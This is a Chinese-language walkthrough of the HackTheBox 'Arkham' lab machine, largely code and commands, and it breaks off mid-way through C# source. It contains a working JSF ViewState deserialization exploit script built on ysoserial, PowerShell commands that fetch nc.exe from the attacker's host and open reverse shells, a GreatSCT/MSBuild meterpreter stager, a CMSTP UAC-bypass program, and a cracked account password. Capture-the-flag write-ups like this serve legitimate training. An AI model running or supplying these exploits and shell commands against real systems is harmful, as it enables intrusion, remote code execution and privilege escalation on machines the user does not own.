<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3xDJurng0jfoxjPsdIi70w)

Arkham 是一个中等难度的靶机，但是它的难度可以和困难相媲美。其中涉及了 lucks 解密、JSF ViewState 反序列化、ost 邮件分析、UAC 绕过等相关知识。ViewState 反序列化漏洞让我学到了很多，虽然其中的数据是加密的，但是它提供了一个用于执行攻击的密钥使得我能够成功获取 shell，上线后在电子邮件中找到了管理员密码，需要绕过 UAC 限制拿到最后的 flag。感兴趣的同学可以在 HackTheBox 中进行学习。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeYFqLvjcIvSr6LGS6TSJHvGTFqjISq56wKR9b95oBmicFib84lz1keaUA/640?wx_fmt=png)截屏 2021-12-15 下午 2.38.20

0x01 侦查
-------

### 端口扫描

使用 nmap 对目标进行端口扫描

```
nmap -Pn -p- -sV -sC -A 10.10.10.130 -oA nmap_Arkham<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeJUsNpm7xiazZKsMrzULb2m68jfbCEP8LkP97ciborerg5o8r7uIfZZow/640?wx_fmt=png)通过 nmap 的扫描结果可以发现目标开放了 80、135、139、445、8080 端口

#### 80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aed6Crvh8ANeryFMsebOurnRhH6K4MOUvd6Ogv21iaa8sVzOxq4LoNcVQ/640?wx_fmt=png)80 端口为 IIS 默认界面，使用 gobuster 进行目录扫描

```
gobuster dir -u http://10.10.10.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeazbz1niaVQGv83oXGLNibBqep0L5cupxO9FH1kI1lhXkNf9tD9ic8ia1lw/640?wx_fmt=png)截屏 2021-12-15 下午 3.39.43

但是并没有扫描到什么有价值的目录

#### 8080 端口

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeqlg1N101Z6RYgrsXqr8JD8lVh1rAzSz5vRxpzRR4nb1uQNghZTn5Gg/640?wx_fmt=png)页面显示这是一家名为 Mask 的公司，主要业务为数据保护。使用 gobuster 进行目录扫描

```
gobuster dir -u http://10.10.10.130:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeeBCKGYYFRuYlcVaNVNoibG8PFXjCkFLJ7AE3tj4LJgZo8tv0Mw4E1zw/640?wx_fmt=png)也没有发现什么有用的目录，查看网站可以在订阅中发现一个交互点![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeicej4hmPVz3HAx6dJrTjn2DqiaBLh4siay2YYnv7CSe8FucD6y9J1iaV7Q/640?wx_fmt=png)输入 mac 会给你一个返回信息![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeNtlfVkUqVe4xYVtLhHHZq2OjgF2m7d2wfoIdGrjibpbKPf0y7Q3a3pQ/640?wx_fmt=png)

#### 445 端口

使用 smbclient 查看当前共享

```
smbclient -N -L //10.10.10.130<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aegGwS7FCVeclFX966SiaNmicS0KttWPqkA3icxOR5rlKrQsMHcoshEoE0A/640?wx_fmt=png)也可以使用 smbmap 进行扫描，但是获取到的信息并没有很多

```
smbmap -H 10.10.10.130<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99ae4SyW618t0dlI3yGWB1JL5Y6RIPwjycvsflmzS0jRnmWPvrmG2D9mlg/640?wx_fmt=png)截屏 2021-12-17 下午 4.49.55

**Users** 查看 Users 共享

```
smbclient //10.10.10.130/users<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeexYmdoIe4WsSo9icJHASUAsoAtJ7ianAcu6sia5qUuFS3o7CeqvPA2vhQ/640?wx_fmt=png)截屏 2021-12-17 下午 4.53.07

**BatShare** 查看 BatShare 共享

```
smbclient //10.10.10.130/batshare<br style="box-sizing: border-box;">smb > get appserver.zip<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeLo3rmufrQqF3kHugD2icKFic7lxiaGPPCHoE9VXCvefgSpWys18G0JrPg/640?wx_fmt=png)通过对 Users 以及 BatShare 共享的探索我们发现 Users 中只存放了一些默认用户和访客用户的文件，而 BatShare 中包含了一个压缩包`appserver.zip`同时将其下载下来

### lucks 映像

将下载下来的压缩包解压

```
unzip appserver.zip<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeHUPTdCic7O1a3BGzDO5p8tuzLUqkiciabQ0HAkicrzibll4FiafxSjjgtNRA/640?wx_fmt=png)其中包含一个文本和一个加密的磁盘映像

#### 爆破 lucks 密码

LUCKS 是 linux 硬盘加密的标准，如果我要访问里面的文件，必须先找到其中的密码。使用 bruteforce-luks 对密码进行爆破

```
apt install bruteforce-luks<br style="box-sizing: border-box;">cat /usr/share/wordlists/rockyou.txt | grep batman > test.txt<br style="box-sizing: border-box;">bruteforce-luks -t 10 -f test.txt backup.img -v 60<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99ae9YCAK4Gd6yYk0LhVyP1Nib9miccHr2h8dvzPmlEzrhic3uqQowVfeP4Uw/640?wx_fmt=png)成功跑出密码为：batmanforver

#### 挂载磁盘映像

使用 cryptsetup 打开文件

```
cryptsetup open --type luks backup.img arkham
```

查看驱动发现一个新设备

```
ls -l /dev/mapper/<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeLoLos0l7ibIvcy9Io4I4MDw9LMn5d79HQNXxmN9CfFB1xe6Ip70GibUg/640?wx_fmt=png)截屏 2021-12-17 下午 5.39.13

挂载新设备到 Arkham 目录下

```
mount /dev/mapper/arkham ~/hackthebox/Machines/Arkham/mnt/<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeicb9FUQiaeO5DZlFaMfNVB7SvWKfCvW6hR8z6ZRsdjQiaRKkXH4N6yKhQ/640?wx_fmt=png)截屏 2021-12-17 下午 5.40.14

开始对目录中的文件进行枚举

```
find ~/hackthebox/Machines/Arkham/mnt/ -type f
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aegEJGyavziadFF83FhlZa2F1kLNf5icRlWKPiaxqkSGCChXBia2snfnsU1Q/640?wx_fmt=png)其中包括蝙蝠侠的图片和 tomcat-stuff 文件夹，通过对其中各个文件的筛查，我们在 web.xml.bak 中发现了有趣的东西![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aebUemkj7upn0QeJOJsKaaGicC3iaeHRbMd95WU7fAWXCBK2VakyWukaug/640?wx_fmt=png)根据以上配置文件我们可以在发现如下信息

```
该站点会匹配 *.faces 来调用 servletmyfaces 的 SECRET 为 SnNGOTg3Ni0=HmacSHA1 的 SECRET 为 SnNGOTg3Ni0=SnNGOTg3Ni0= 经过解码后为 JsF9876-JSF 版本为 2.5.2
```

0x02 JSF 反序列化上线 [Alfred]
------------------------

### JSF ViewState 反序列化漏洞

> JSF 框架主要使用序列化来保持站点的状态，它会帮助服务器序列化一个 Java 对象，并将其作为网页中的隐藏字段发送到客户端，当客户端提交时该序列化对象被发送回服务器，服务器可以使用它来取回状态。反序列化漏洞是允许用户提交序列化对象，如果序列化对象包含恶意代码，那么在反序列化过程中就会运行。从而用户可以控制输入来获取执行权限。

通过以上介绍和分析，我们可以推测该站点可能存在反序列化漏洞，那么如何来验证该漏洞呢？可采取以下思路

```
1、测试提交错误的 ViewState 会发生什么？2、解密 ViewState 变量来显示我的加密密钥有效3、构建脚本加密好的 ViewState 并进行提交4、使用 ysoserial 来生成 payload，它可以使用脚本中的 ViewState 来 ping 主机5、更新 payload 获取反弹shell
```

找到之前的订阅栏目，使用 BurpSuite 将数据包拦截，具体数据包如下![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeJToEUZtWfbfibaAYKbW5P9HCgasvHgggAGsjMkwoic2ekyIEpO1Fo9sw/640?wx_fmt=png)将 javax.faces.ViewState 参数的值的第一个字符从 w 字符修改为 W 字符，查看页面报错信息![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aedBQqt2EYx4XxuEytb0iaGJXEWcfLH6UIOFckck2RYLf5ibW0DRtliaEtw/640?wx_fmt=png)返回信息提示`No Saved view state could be found for the view identifier`，这说明修改是有效的

### 探索 ViewState

我们可以抓取到 javax.faces.ViewState 参数的值如下

```
javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
```

通过 python 代码来获取其中的字节流

```
from base64 import b64decodefrom urllib.parse import unquote_plus as urldecodevs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'vs_urldecode = urldecode(vs)print(vs_urldecode)vs_bs64decode = b64decode(vs_urldecode)print(vs_bs64decode)
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeV9mSjAJ3utvoPJCe8WJMib9bwVkO7YQib0Z8Sn9Kxpm2FdiccvibjFWkFA/640?wx_fmt=png)截屏 2021-12-18 下午 8.09.27

这是加密的字节流，我们需要通过解密来获取其中的信息。SHA1 的长度通常为 20 字节，很可能附加到首位或末尾。经过测试 HMAC 存储在最后 20 字节中

```
from base64 import b64decodefrom urllib.parse import unquote_plus as urldecodefrom hashlib import sha1import hmacvs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'vs_urldecode = urldecode(vs)vs_bs64decode = b64decode(vs_urldecode)mac = vs_bs64decode[-20:]enc = vs_bs64decode[:-20]enc_hmac = hmac.new(b'JsF9876-', enc, sha1).digest()print(mac)print(enc_hmac)
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeT12MREmrwFcE58dvLUx01LaJ2oL2yTCjj3hrSaz0LNHovfIWZ068Sw/640?wx_fmt=png)目前已知加密方式、加密位置以及密钥，接下来就可以解密这串值

```
from base64 import b64decodefrom urllib.parse import unquote_plus as urldecodefrom Crypto.Cipher import DESvs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'vs_urldecode = urldecode(vs)vs_bs64decode = b64decode(vs_urldecode)enc = vs_bs64decode[:-20]d = DES.new(b'JsF9876-', DES.MODE_ECB)print(d.decrypt(enc))
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aevVKT1DY3AG8950TiaibLlg6rhXsG9ic5nRPxODI7smfMMAwiaBF9AXtUew/640?wx_fmt=png)经过解密后出现字符串说明解密确实是正确的

使用 ysoserial 来生成 ping 命令的 payload

```
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar BeanShell1 'ping 10.10.14.14' > text
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aemFw0pdCVuvXSxlC98uNcpiaPR249fk0eUlzXmG2B5ENxNs0WAFqBdAA/640?wx_fmt=png)生成成功，但是我需要将其放入 python 脚本当中进行调用

> 安装模块 pip install pycryptodome

```
import requestsimport subprocessimport sysfrom base64 import b64encodefrom Crypto.Cipher import DESfrom Crypto.Hash import SHA, HMACfrom os import devnullfrom urllib.parse import quote_plus as urlencodewith open(devnull, 'w') as null:    payload = subprocess.check_output(['java', '-jar', '/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', sys.argv[1], sys.argv[2]], stderr=null)pad = (8 - (len(payload) % 8)) % 8padded = payload + (chr(pad)*pad).encode()d = DES.new(b'JsF9876-', DES.MODE_ECB)enc_payload = d.encrypt(padded)sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()viewstate = b64encode(enc_payload + sig)sess = requests.session()sess.get('http://10.10.10.130:8080/userSubscribe.faces')resp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',        data = {'j_id_jsp_1623871077_1%3Aemail': 'd',                'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',                'j_id_jsp_1623871077_1_SUBMIT': '1',                'javax.faces.ViewState': viewstate})
```

启动本地监听

```
tcpdump -i tun0 icmp<br style="box-sizing: border-box;">
```

使用脚本执行 ping 命令

```
python3 exploit.py BeanShell1 'ping 10.10.14.14'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aepW03yx5oJo6Sj1015oJfbIXO1NQErfShPKysMztC46TegH4J22mwgg/640?wx_fmt=png)成功收到 ping 命令，反序列化漏洞验证成功

### 获取 shell

为了获取目标站点的 shell，我们把 nc64.exe 放在本目录下并开启 http 服务

```
python -m SimpleHTTPServer 80<br style="box-sizing: border-box;">
```

在本地开启监听，接收反弹 shell

```
rlwrap nc -nvlp 443 <br style="box-sizing: border-box;">
```

这里需要在 exploit.py 进行略微修改，源码如下

```
#!/usr/bin/env python3import requestsimport subprocessimport sysfrom base64 import b64encodefrom Crypto.Cipher import DESfrom Crypto.Hash import SHA, HMACfrom os import devnullfrom urllib.parse import quote_plus as urlencodewith open(devnull, 'w') as null:    payload = subprocess.check_output(['java', '-jar', '/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', 'CommonsCollections5', sys.argv[1]], stderr=null)pad = (8 - (len(payload) % 8)) % 8padded = payload + (chr(pad)*pad).encode()d = DES.new(b'JsF9876-', DES.MODE_ECB)enc_payload = d.encrypt(padded)sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()viewstate = b64encode(enc_payload + sig)sess = requests.session()sess.get('http://10.10.10.130:8080/userSubscribe.faces')resp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',        data = {'j_id_jsp_1623871077_1%3Aemail': 'd',                'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',                'j_id_jsp_1623871077_1_SUBMIT': '1',                'javax.faces.ViewState': viewstate})
```

执行以下命令上传 nc 并使用 nc 连接本地 443 端口

```
python3 exploit2.py "powershell -c Invoke-Webrequest -uri 'http://10.10.14.14/nc64.exe' -outfile \windows\system32\spool\drivers\color\nc.exe"python3 exploit2.py "\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.14 443"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aew0gicXUbkr8KbdoMJtpPPicrfx3hCLZzMctrSTLPKJzFUOM0vaZX0uAA/640?wx_fmt=png)成功收到反弹 shell

### 读取 user.txt

在 Alfred 的桌面上找到 flag

```
dir C:\Users\Alfred\Desktoptype C:\Users\Alfred\Desktop\user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeh3MZtc52IHSNRbicFan68zmvJnIarkAZRjeYCHSRFbNp0zmcHR36VFA/640?wx_fmt=png)成功拿到第一个 flag

0x03 权限提升 [batman]
------------------

### 获得密码

在主目录下枚举关键文件

```
dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99ae6bXGicm1RuiafJE48OThDoh5hxxtaYtRwOmfxsDAicGnaOia5K8W2IpLGw/640?wx_fmt=png)发现 backup.zip，我们需要将其下载到本地。借助 smbserver 来建立 smb 共享，同时设置账号密码，否则无法连接

```
python3 smbserver.py -smb2support -username mac -password mac share /root/hackthebox/Machines/Arkham/<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeYMpCmmR9icqlAI08ics15lz3YcPQY5gTqzicFjP8mGReX5aYywZQFfFxA/640?wx_fmt=png)在靶机上复制 backup.zip 到本机目录下

```
net use \\10.10.14.14\share /u:mac mac<br style="box-sizing: border-box;">copy C:\Users\Alfred\Downloads\backups\backup.zip \\10.10.14.14\share\<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeXsX2wdWA1icXItLo5KzuTkXzHNYsTsnPlbPcwoWAA49HkwDjVpa6xmQ/640?wx_fmt=png)解压该文件，里面包含一个 ost 文件，是 Microsoft Outlook 的脱机文件夹文件

```
unzip -l backup.zip<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeoibCNQSsvZXibshJk0Ph2N5IKnuIz8OjNT0a3Lb2SFVKia7we5SroKicUQ/640?wx_fmt=png)截屏 2021-12-20 上午 3.54.09

借助 readpst 来进行解析，该工具可以用来解析`.pst`、`.ost`文件

```
readpst alfred@arkham.local.ost<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aecbuIp8uUrnnaqybfWQz8EDv84XHvFibfB7SoHem30W7IyvKd0EahYhg/640?wx_fmt=png)解压完成是一个`.mbox`文件，这是一种电子邮件邮箱文件格式，可在单个文件中存储多条消息并将其作为文本。使用 mutt 来打开它

```
mutt -R -f Drafts.mbox<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeOZdHxoFrlmIP1X3x8lS5F0zo0gmASaOUsW0DsShHibdia6htrpGK9wvw/640?wx_fmt=png)这是一封给 batman 的邮件，翻到最后存在一个附件![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeMUnCYibo1MnhNoUPlK2ubuMq7KicWSXuwbgwZALpuQcCmpoOb2hJXHCw/640?wx_fmt=png)通过 v 来查看附件![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeOVTmaDDsbjiahfThsuJwLKsiabMEzVFazW9qdUUiaaoxJQZQx0fEpmgOg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeC5Lu4lhLmuiaouRdL1Iqj7OJBTWXCXZv4TCwJFHaBIAZYc111F18A9g/640?wx_fmt=png)成功获取到账号密码为：batman/Zx^#QZX+T!123

### 获取 shell

进入 powershell 来制作凭据

```
powershell$username = 'batman'$password = 'Zx^#QZX+T!123'$securePassword = ConvertTo-SecureString $password -AsPlainText -Force$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

建立凭据后开启监听 2222 端口，之后执行命令以 batman 身份反弹 shell

```
Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.14.14 2222 }
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aecN6KicZ97lkGjuNjXHbw6PoR358Wmq5qNfLFy0JWkND4hvK8NETIQjg/640?wx_fmt=png)成功获得 shell![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99ae5Q0FfIm9kiaveicHok2jA3LY8uTEdJ8m18frAGlxPYjd1uWJB24wjTpQ/640?wx_fmt=png)

0x04 UAC 绕过
-----------

### 受限环境

查看当前用户权限

```
net user batman<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aebt0nOADPNTur431F1BhwNBSocibibwY49iaiaPMBh2kdlrQ5ySDE5kpdEw/640?wx_fmt=png)该用户拥有管理员和远程管理员权限，但是读取 root.txt 时无法访问 administrator 的桌面

```
dir c:\Users\administrator\Desktoptype c:\Users\administrator\Desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeXJFjNWG5nkYo7PPO5AFEpYkdzkmCJL7qfq7Wae0FMJU2WUJcRurC7A/640?wx_fmt=png)查询权限，判断当前环境为受限状态且 UAC 状态已经启用![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeTrlrXkDU1WBEWtbVswCnHdCJtZGJjo6FxTPPJOMz5Gdu4qQuLzXnXQ/640?wx_fmt=png)

### 通过本地共享读取 root.txt

```
type \\localhost\c$\users\administrator\desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeJf41yKFvpdlLlUZuqHep6v3roAQdveOqiaJ6IV9LoYK7AsRsSEibq9tQ/640?wx_fmt=png)成功拿到第二个 flag

### 借助 msf 绕过 UAC 读取 root.txt

#### 建立 meterpreter 会话

由于绕过大多数 UAC 都需要交互过程，使用 msf 能够有效帮助我们绕过 UAC。借助 GreatSCT 来获取一个 meterpreter _**工具地址：https://github.com/GreatSCT/GreatSCT**_

```
cd setup./setup.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aedYHzqrcOAsicRibcsKqx8qEpADpk6coNaIPFNXeZ5KG1tKU6D1QzHCmw/640?wx_fmt=png)建立完成后，使用 GreatSCT.py 查看相关命令

```
python3 GreatSCT.py<br style="box-sizing: border-box;">
```

使用 bypass

```
use bypass<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeib1ibz78OpV9EWbgbI1JoBDJPZAxzUMz8QhZD8Gq4j9CAPAeJkUoBKRA/640?wx_fmt=png)查看反弹脚本

```
list<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeJQAWHeib3mbW0ZHMmRSCUy7XnAictXGm9Sia3uEiaqybgLJQ5iamKBYYpxQ/640?wx_fmt=png)使用`msbuild/meterpreter/rev_tcp.py`设置 tcp 监听

```
use msbuild/meterpreter/rev_tcp.py<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeEpefiaYUciclu9q5Hnd3ChGvgp0dib5y8336ibrJmIhdWwbu342cIDXrUw/640?wx_fmt=png)截屏 2021-12-20 上午 5.15.13

设置本地 IP 和端口

```
set LHOST 10.10.14.14set LPORT 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aez4WUbngobWwHMriah5bAe6ibtLhIeU5gQibt6cw0ib8SMDZ4aLxucaF1Bg/640?wx_fmt=png)截屏 2021-12-20 上午 5.16.17

```
generate##输入arkham
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aerCrkmftUrBc0ib7ILqSVctYoUVRVG4DBvsZo5Ts523G8LQduicib71tKQ/640?wx_fmt=png)成功生成 arkham.xml 、arkham.rc，这两个文件有不同的作用。arkham.xml 用于在 windows 中反弹 meterpreter，arkham.rc 用于在 msf 中直接配置监听![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99ae0NchwRunvleCp2HsUt5NKwjkIkkfjibGxuxZ1IRialLljN8JPOpteGZw/640?wx_fmt=png)

使用 msfconsole 加载 rc 文件并设置参数

```
msfconsole -r arkham.rc<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99ae4IFHAdYndKaStAOuWibs5YP7xCk0KDr9DWicaOy5Ocn1pZFtXPCQiaEgA/640?wx_fmt=png)截屏 2021-12-20 上午 5.21.19

与此同时将 xml 文件移动到目标靶机上

```
cd \Users\Batman\appdata\local\temp\net use \\10.10.14.14\share /u:mac maccopy \\10.10.14.14\share\arkham.xml C:\Users\Batman\appdata\local\temp\
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aezic7KjFobEGWuiak9fBh7k4pRk054OicibsQQLtAicvzeaWakmkV4K0fd1w/640?wx_fmt=png)截屏 2021-12-20 上午 5.24.19

运行 msbuild 获取 meterpreter 会话

```
\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \Users\Batman\appdata\local\temp\arkham.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeFqfrk80b6qNAMZxibjOAD0xh2ygBs1XiaXwoV6M9HPz6dX29mj8wNNwQ/640?wx_fmt=png)在 msf 中成功返回会话![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeNIoVicQ7XGDhD8Qice8soOHGLib7L2Q1VsvBtPKJUkICLbVJcic2NJoEXw/640?wx_fmt=png)

#### CMSTP UAC 绕过

_**参考文章：https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html**_

```
/* UAC Bypass using CMSTP.exe microsoft binaryBased on previous work from Oddvar Moehttps://oddvar.moe/2017/08/15/research-on-cmstp-exe/And this PowerShell script of Tyler Applebaumhttps://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1Code author: Andre Marques (@_zc00l)*/using System;using System.Text;using System.IO;using System.Diagnostics;using System.ComponentModel;using System.Windows;using System.Runtime.InteropServices;public class CMSTPBypass{    // Our .INF file data!    public static string InfData = @"[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]CustomDestination=CustInstDestSectionAllUsersRunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection]; Commands Here will be run Before Setup Begins to installREPLACE_COMMAND_LINEtaskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers]49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection]""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"[Strings]Service;    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";    /* Generates a random named .inf file with command to be executed with UAC privileges */    public static string SetInfFile(string CommandToExecute)    {        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];        string TemporaryDir = "C:\\windows\\temp";        StringBuilder OutputFile = new StringBuilder();        OutputFile.Append(TemporaryDir);        OutputFile.Append("\\");        OutputFile.Append(RandomFileName);        OutputFile.Append(".inf");        StringBuilder newInfData = new StringBuilder(InfData);        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());        return OutputFile.ToString();    }    public static bool Execute(string CommandToExecute)    {        if(!File.Exists(BinaryPath))        {            Console.WriteLine("Could not find cmstp.exe binary!");            return false;        }        StringBuilder InfFile = new StringBuilder();        InfFile.Append(SetInfFile(CommandToExecute));        Console.WriteLine("Payload file written to " + InfFile.ToString());        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);        startInfo.Arguments = "/au " + InfFile.ToString();        startInfo.UseShellExecute = false;        Process.Start(startInfo);        IntPtr windowHandle = new IntPtr();        windowHandle = IntPtr.Zero;        do {            windowHandle = SetWindowActive("cmstp");        } while (windowHandle == IntPtr.Zero);        System.Windows.Forms.SendKeys.SendWait("{ENTER}");        return true;    }    public static IntPtr SetWindowActive(string ProcessName)    {        Process[] target = Process.GetProcessesByName(ProcessName);        if(target.Length == 0) return IntPtr.Zero;        target[0].Refresh();        IntPtr WindowHandle = new IntPtr();        WindowHandle = 